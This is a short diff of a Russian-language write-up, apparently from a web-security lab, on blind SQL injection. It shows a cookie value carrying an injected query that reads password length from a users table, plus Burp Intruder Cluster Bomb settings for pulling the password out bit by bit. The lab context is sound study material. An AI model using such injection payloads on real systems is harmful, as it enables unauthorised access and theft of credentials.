@@ -333,8 +333,11 @@ Cookie: TrackingId=r4V0ibLxkukwJhUL' AND (SELECT LENGTH(password) FROM users WHE
 intruder - подбор пароля с помощью битовых операция.
 
 > Тип атаки: **Cluster Bomb**
+> 
 > Payload 1: Numbers \[1-20]
+> 
 > Payload 2: Simple list \[128,64,32,16,8,4,2,1]
+> 
 > Payload 3: Copy other payload 2
 
 ```http
